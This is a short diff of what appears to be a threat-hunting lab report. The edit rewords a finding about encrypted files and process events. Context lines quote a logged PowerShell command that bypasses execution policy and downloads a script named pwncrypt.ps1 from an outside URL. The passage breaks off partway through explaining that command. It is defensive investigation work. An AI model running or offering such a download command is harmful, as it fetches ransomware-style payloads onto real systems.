@@ -62,7 +62,7 @@ DeviceFileEvents
 
 ### 3. Searched the `DeviceProcessEvents` Table
 
-I next checked the DeviceProcessEvents table in order to determine how the files were encrypted. I found evidence of manual `cmd.exe` of powershell running 
+Next, I examined the DeviceProcessEvents table to identify how the files were encrypted. The data revealed evidence of manual execution of `cmd.exe` and `powershell.exe`.
 - Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
   - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
     - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
